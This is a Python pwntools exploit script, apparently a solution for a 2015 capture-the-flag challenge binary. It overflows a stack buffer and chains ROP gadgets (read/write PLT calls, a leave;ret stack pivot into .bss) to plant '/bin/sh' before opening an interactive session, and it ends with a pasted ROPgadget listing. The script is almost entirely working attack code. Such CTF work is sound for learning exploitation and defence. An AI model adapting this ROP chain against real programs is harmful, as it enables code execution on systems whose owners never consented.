#!/usr/bin/env python
# coding=utf-8
# date: 2018-11-13
from pwn import *
context.local(arch='i386', os='linux')

# 
bof_offset = 112

readplt = 0x080483A0
writeplt = 0x080483D0
bss_base = 0x0804a000

pop3ret = 0x08048619
popebpret = 0x0804861b
leaveret = 0x08048458 #  leave ; ret 
retvalue = 0x080485A7

binsh= "/bin/sh\x00"

def pwn():
    if attach: gdb.attach(io, 'b *0x0804851E\n ')
    io.recvuntil("Welcome to XDCTF2015~!")

    payload = 'a'*bof_offset
    payload += p32(readplt) + p32(pop3ret) + p32(0) + p32(bss_base+0x100) + p32(0x100)
    payload += p32(popebpret) + p32(bss_base+0x100-0x4) + p32(leaveret)   # stack pivot 8*4 28bytes
    payload += (0x100 - len(payload))*'t'

    io.send(payload)
    # sleep(1)

    #raw_input('sendpayload2...')
    payload1 = p32(writeplt) + p32(pop3ret) + p32(1) + p32(bss_base+0x100+0x90) + p32(len(binsh))
    payload1 += p32(retvalue) #p32(retvalue)
    payload1 += (0x90 - len(payload1))*'t'
    payload1 += binsh
    payload1 += (0x100 - len(payload1))*'t'

    io.send(payload1)
    # io.sendline(payload)


if __name__ == '__main__':
    global io, elf, rop, attach, local
    filename = './bof'
    rop = ROP(filename)
    elf = ELF(filename)

    local, attach = 1, 0
    context.log_level = 'debug'

    if local:
        io = process(filename)
        # context.terminal = ['tmux', '-x', 'sh', '-c']
        context.terminal = ['tmux', 'splitw', '-h' ]
    pwn()
    io.interactive()



'''
$ ROPgadget --binary bof --only "pop|ret"
Gadgets information
============================================================
0x0804861b : pop ebp ; ret
0x08048618 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08048379 : pop ebx ; ret
0x0804861a : pop edi ; pop ebp ; ret
0x08048619 : pop esi ; pop edi ; pop ebp ; ret 
'''
